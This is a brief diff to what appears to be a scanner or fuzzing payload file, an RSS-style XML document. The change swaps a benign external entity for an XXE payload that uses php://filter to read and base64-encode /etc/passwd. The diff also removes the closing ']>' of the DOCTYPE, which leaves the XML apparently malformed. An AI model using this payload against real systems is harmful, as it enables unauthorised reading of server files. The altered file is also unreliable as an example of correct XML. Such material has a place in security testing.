@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE scan [
-    <!ENTITY test SYSTEM "target.xml">
-]>
+    <!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page</title>
